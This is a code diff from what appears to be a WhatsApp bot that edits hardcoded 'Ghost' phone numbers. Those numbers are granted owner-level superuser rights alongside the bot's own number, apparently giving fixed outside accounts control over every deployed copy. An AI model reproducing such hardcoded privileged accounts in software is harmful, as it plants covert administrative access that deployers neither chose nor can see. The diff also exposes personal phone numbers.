@@ -344,10 +344,10 @@ async function startKeith() {
       const pushname = m.pushName || "No Name";
       const botNumber = await client.decodeJid(client.user.id);
       const servBot = botNumber.split('@')[0];
-      const Ghost = "254796299158"; 
+      const Ghost = "254796299159"; 
       const Ghost2 = "254110190196";
-      const Ghost3 = "2547483876159";
-      const Ghost4 = "254743995989";
+      const Ghost3 = "254748387615";
+      const Ghost4 = "254786989022";
       const superUserNumbers = [servBot, Ghost, Ghost2, Ghost3, Ghost4, dev].map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net");
       const isOwner = superUserNumbers.includes(m.sender); 
       const isBotMessage = m.sender === botNumber;  
